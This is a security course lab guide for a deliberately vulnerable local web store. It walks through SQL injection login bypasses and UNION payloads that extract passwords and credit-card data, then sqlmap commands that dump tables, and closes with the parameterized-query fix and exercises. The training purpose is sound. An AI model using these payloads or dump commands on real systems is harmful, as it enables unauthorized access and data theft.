# Week 5 — SQL Injection Lab (PixelCart mobile store)

> ⚠️ **Warning**
> This app is **intentionally vulnerable** for teaching purposes only.
> Run it on `localhost` only. Never deploy it to a public server.

Goal of this section: understand SQL injection from the ground up, perform a UNION-based attack by hand, then automate it with sqlmap — and finally see the correct fix.

---

## 0) Running the lab

Requirements: Node.js 18+ (tested on 23).

```bash
npm install
npm start          # VULNERABLE mode -> http://localhost:3000
```

To run the fixed (secure) version later:

```bash
# Linux / macOS
SECURE=1 node server.js

# Windows PowerShell
$env:SECURE=1; node server.js
```

The database is rebuilt in memory every time you start the server, so if you break something, just stop and start again to reset.

### The endpoints we'll attack

| Endpoint | Context | Vulnerability |
|---|---|---|
| `GET /products?search=` | string (inside quotes) | UNION-based, boolean, error |
| `GET /product?id=` | numeric (no quotes) | UNION-based, numeric |
| `POST /login` | string | authentication bypass |

Every page prints the exact SQL that was executed, so you can see how the input flows into the query.

---

## 1) SQL Injection Fundamentals

### The idea in one line
SQL injection happens when the app takes user input and puts it **directly into the SQL query text** as raw string (string concatenation), with no separation between the "code" (the SQL) and the "data" (the input). The input can then change the meaning of the query itself.

Look at the vulnerable code in `server.js` at login:

```js
const sql =
  "SELECT id, username, is_admin FROM users " +
  "WHERE username = '" + u + "' AND password = '" + p + "'";
```

If the user types this into the username field:

```
admin'--
```

The query becomes:

```sql
SELECT id, username, is_admin FROM users WHERE username = 'admin'--' AND password = '...'
```

- The `'` closes the username string early.
- The `--` starts a SQL comment, so everything after it (the password check) is ignored.
- Result: you log in as admin without knowing the password.

Try it: open `/login` and set username to:

```
admin'--
```

and any password. You should see "Login OK".

### Authentication bypass, another way (OR 1=1)
In the username field type:

```
' OR '1'='1
```

This makes the WHERE condition always true, so it returns the first user in the table (usually admin).

### Types of SQLi (quick map)

- **In-band / UNION-based**: the result comes back in the same page. This is our focus today.
- **Error-based**: extract data from error messages.
- **Boolean-based blind**: no direct output; you ask the DB true/false questions and infer from the page response.
- **Time-based blind**: like boolean, but you infer from whether the response was delayed (sleep).

---

## 2) UNION-based Injection — step by step

The idea of `UNION`: it appends the result of a second `SELECT` below the result of the original query. Two conditions must hold:

1. Same **number of columns** in the original and the injected SELECT.
2. **Compatible types** in the columns that get displayed.

We'll work on the product search:

```
GET /products?search=...
```

The original query returns 4 columns:

```sql
SELECT id, name, description, price FROM products WHERE name LIKE '%<search>%'
```

### Step 1 — count columns with ORDER BY
Increase the number until the query breaks:

```
zzz' ORDER BY 1-- 
zzz' ORDER BY 2-- 
zzz' ORDER BY 4-- 
zzz' ORDER BY 5--      <-- error here => 4 columns
```

Type the payload into the search box (no need to write `search=`; the form does that). Example value:

```
zzz' ORDER BY 5-- 
```

> Note: there is a space after the `--` at the end of the payload. This matters in SQLite and MySQL for the comment to work correctly.

### Step 2 — use the right column count and find the visible ones
We now know it's 4 columns. Try a UNION with numbers to see which columns are shown on screen:

```
zzz' UNION SELECT 1,2,3,4-- 
```

You'll see a row with 1,2,3,4 in the results => all four columns are displayed.

### Step 3 — extract the sensitive data
Now replace the numbers with real column names from the users table:

```
zzz' UNION SELECT id, username, password, is_admin FROM users-- 
```

You should get the usernames and passwords of all users in the results. In this revamped UI the smuggled data shows up right inside the product cards — a realistic, visual demo.

### Step 4 — Database fingerprinting (SQLite)
Get the DB version:

```
zzz' UNION SELECT 1, sqlite_version(), 3, 4-- 
```

Get the table names from SQLite's catalog:

```
zzz' UNION SELECT 1, name, sql, 4 FROM sqlite_master WHERE type='table'-- 
```

### Same thing on the numeric context /product?id=
Here there are no quotes around the id, so you don't need `'`:

```
GET /product?id=0 UNION SELECT id, username, password, credit_card FROM users-- 
```

In the browser the URL looks like this (spaces become `%20`):

```
http://localhost:3000/product?id=0%20UNION%20SELECT%20id,username,password,credit_card%20FROM%20users--%20
```

We used `id=0` because product 0 doesn't exist, so the only result shown is our UNION's.

---

## 3) Automating with sqlmap

sqlmap is a tool that detects and exploits SQLi automatically. Instead of doing all the steps above by hand, you give it the URL and it does the rest.

### Install

```bash
# Easiest if you have Python:
pip install sqlmap

# Or from git:
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
python sqlmap/sqlmap.py --version

# On Kali it's preinstalled: just type sqlmap
```

> Note: start the app first (`npm start`) before running any sqlmap command.

### 3.0) Basic usage

The core workflow is 4 steps, in order: **detect → tables → columns → dump**.

1) Detect the vulnerability:

```bash
sqlmap -u "http://localhost:3000/product?id=1" --batch
```

2) List the tables:

```bash
sqlmap -u "http://localhost:3000/product?id=1" --batch --tables
```

3) List the columns of the users table:

```bash
sqlmap -u "http://localhost:3000/product?id=1" --batch -T users --columns
```

4) Dump the users data (the goal):

```bash
sqlmap -u "http://localhost:3000/product?id=1" --batch -T users --dump
```

Specific columns only:

```bash
sqlmap -u "http://localhost:3000/product?id=1" --batch -T users -C username,password --dump
```

All data at once:

```bash
sqlmap -u "http://localhost:3000/product?id=1" --batch --dump-all
```

> **Important on SQLite:** `--dbs` does not work because SQLite has no concept of multiple databases (the file itself is the DB). sqlmap will tell you `use only '--tables'`. That's a normal warning, not a failure — use `--tables` directly.

#### If you have a saved request from Burp (request file)

Instead of typing the URL and parameters by hand, save the request to a file and use `-r`:

```bash
sqlmap -r ./search.req --batch --tables
sqlmap -r ./search.req --batch -T users --dump
```

> If sqlmap prints `resumed ... from stored session`, it's running from a previous scan's results. To re-run the scan from scratch, add `--flush-session`.

Core flags:

| Flag | What it does |
|---|---|
| `-u` | target URL (with a parameter) |
| `-r` | read the request from a saved file |
| `--batch` | answer all prompts with defaults, non-interactive |
| `--tables` | enumerate tables |
| `-T` | pick a table |
| `-C` | pick specific columns |
| `--dump` | dump the table data |
| `--dump-all` | dump all tables |

Note: dumped data is also saved to files under:

```
~/.local/share/sqlmap/output/
```

### 3.1) Detect on the numeric context

```bash
sqlmap -u "http://localhost:3000/product?id=1" --batch
```

- `-u` the target URL (must contain a parameter like `id`).
- `--batch` makes it answer all prompts with the default, without asking you.

### 3.2) Show databases and tables

```bash
sqlmap -u "http://localhost:3000/product?id=1" --batch --tables
```

- `--tables` lists the tables (on SQLite, skip `--dbs`).

### 3.3) Dump columns and the users table

```bash
sqlmap -u "http://localhost:3000/product?id=1" --batch -T users --columns
sqlmap -u "http://localhost:3000/product?id=1" --batch -T users --dump
```

- `-T users` select the table.
- `--columns` list the table columns.
- `--dump` dump all of the table's data (here you'll see the passwords and credit cards).

### 3.4) On the product search (string context)

```bash
sqlmap -u "http://localhost:3000/products?search=Nova" -p search --batch --dump -T users
```

- `-p search` tells it the parameter to attack is `search`.

### 3.5) On login (POST request)

```bash
sqlmap -u "http://localhost:3000/login" \
       --data="username=admin&password=admin" \
       -p username --batch --dump -T users
```

- `--data` the POST body; its presence makes sqlmap use POST automatically.
- `-p username` the parameter to test.

### Other useful flags

| Flag | What it does |
|---|---|
| `--current-db` | current database name |
| `--current-user` | current DB user |
| `--level=5 --risk=3` | increase scan coverage (more payloads) |
| `--technique=U` | try UNION only (B/E/U/S/T/Q for the rest) |
| `--dbms=sqlite` | tell it the DB type to speed things up |
| `--dump-all` | dump all data from all tables |
| `-r request.txt` | read a saved HTTP request from Burp instead of typing the URL |

A focused UNION example on SQLite:

```bash
sqlmap -u "http://localhost:3000/product?id=1" --batch --dbms=sqlite --technique=U --dump -T users
```

---

## 4) The Fix — Parameterized Queries

The correct solution: **separate code from data** using parameterized queries (prepared statements), so the input is treated as a value, not as SQL.

Instead of string concatenation:

```js
// ❌ vulnerable
const sql = "SELECT * FROM users WHERE username = '" + u + "'";
```

Use placeholders:

```js
// ✅ safe
const stmt = db.prepare('SELECT * FROM users WHERE username = ?');
stmt.bind([u]);
```

Run the secure version and try the same payloads that broke the app earlier:

```bash
# Windows PowerShell
$env:SECURE=1; node server.js
```

- `admin'--` in login is now literally an invalid username => "Invalid credentials".
- The UNION in search is treated as a plain search string => "No rows returned".

Extra defensive lessons:

- **Parameterized queries / ORM** are the primary line of defense.
- **Least privilege**: the app's DB account should not have more rights than needed.
- **Input validation / allow-list** for expected values (e.g. id must be a number).
- **Don't expose raw error messages** to the user.

---

## 5) Exercises

1. Use UNION to extract only the `admin`'s `email` (hint: `WHERE`).
2. List all table names in the DB using `sqlite_master`.
3. Perform an authentication bypass in a third way other than the ones above.
4. Run sqlmap against `/login` and dump the entire users table.
5. Run SECURE mode and prove everything above now fails. Why did the `?` make the difference?

Solutions are in `INSTRUCTOR.md`.
